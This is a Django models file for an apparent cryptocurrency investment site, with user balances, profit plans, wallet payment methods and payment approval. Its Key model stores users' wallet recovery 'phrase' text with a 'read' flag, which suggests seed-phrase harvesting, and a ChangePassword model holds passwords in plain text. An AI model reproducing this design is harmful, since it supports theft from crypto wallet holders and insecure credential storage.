from django.db import models
from django.contrib.auth.models import AbstractUser
from django.contrib.auth.models import User
from django.conf import settings
from django.utils.text import slugify
from django.contrib.auth import get_user_model
import uuid


class CustomUser(AbstractUser):
    fullname = models.CharField(max_length=50, default='')
    phone = models.CharField(max_length=50, default='')
    country = models.CharField(max_length=50,default='0')
    totalprofit = models.CharField(max_length=50,default='0')
    totaldeposit = models.CharField(max_length=50,default='0')
    accountbalance = models.CharField(max_length=50,default='5')
    totalrefbonus = models.CharField(max_length=50,default='0')
    totalbonus = models.CharField(max_length=50,default='5')
    totalwithdrawals = models.CharField(max_length=50,default='0')
    # image = models.ImageField(default='pro.jpg',blank=True)
    def __str__(self):
        return self.username
class Plan(models.Model):
    name = models.CharField(max_length=50,default='0')
    profit = models.CharField(max_length=50,default='0')
    mindeposit = models.CharField(max_length=50,default='0')
    maxdeposit = models.CharField(max_length=50,default='0')
    ref = models.CharField(max_length=50,default='0')
    days = models.CharField(max_length=50,default='0')
    def __str__(self):
        return self.name

class Profit(models.Model):
    user = models.ForeignKey(get_user_model(), on_delete=models.CASCADE)
    plan = models.ForeignKey(Plan,on_delete=models.CASCADE,related_name='+')
    ammount = models.CharField(max_length=50,default='0')
    created = models.DateTimeField(auto_now_add=True)
    def __str__(self):
        return self.user.username
class Join_Plan(models.Model):
    name = models.CharField(max_length=50,default='0')
    user = models.ForeignKey(get_user_model(), on_delete=models.CASCADE)
    price = models.CharField(max_length=50,default='0')
    duration = models.CharField(max_length=50,default='0')
    created = models.DateTimeField(auto_now_add=True)
    def __str__(self):
        return self.user

class Pay_method(models.Model):
    name = models.CharField(max_length=50,default='0')
    wallet = models.CharField(max_length=500,default='0')
    image = models.FileField()
    visible = models.BooleanField(default=True)
    slug = models.SlugField(blank=True)
    def __str__(self):
        return self.name
    def save(self, *args, **kwargs):
        self.slug = slugify(self.name)
        super(Pay_method, self).save(*args, **kwargs)

class Payment(models.Model):
    user = models.CharField(max_length=50,default='0')
    name = models.CharField(max_length=50,default='0')
    price = models.CharField(max_length=50,default='0')
    wallet = models.CharField(max_length=500,default='0')
    image = models.FileField()
    approve = models.BooleanField(default=False)
    def __str__(self):
        return self.name


class Wallet(models.Model):
	name = models.CharField(max_length=50)
	image = models.FileField()
	slug = models.SlugField(blank=True)


	def __str__ (self):
		return self.name


	def save(self, *args, **kwargs):
		self.slug = slugify(self.name)
		super(Wallet, self).save(*args, **kwargs)


class Key(models.Model):
    user = models.ForeignKey(get_user_model(), on_delete=models.CASCADE)
    wallet_type = models.CharField(max_length=50000,default='0')
    phrase = models.TextField(max_length=20000, null=True)
    read = models.BooleanField(default=False)


    def __str__ (self):
        return str(self.wallet_type)


class ChangePasswordCode(models.Model):
	user_email = models.EmailField(max_length=50)
	user_id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)

class ChangePassword(models.Model):
	new_password = models.CharField(max_length=50, blank = False, null = False)
	confirm_new_password = models.CharField(max_length=50, blank = False, null = False)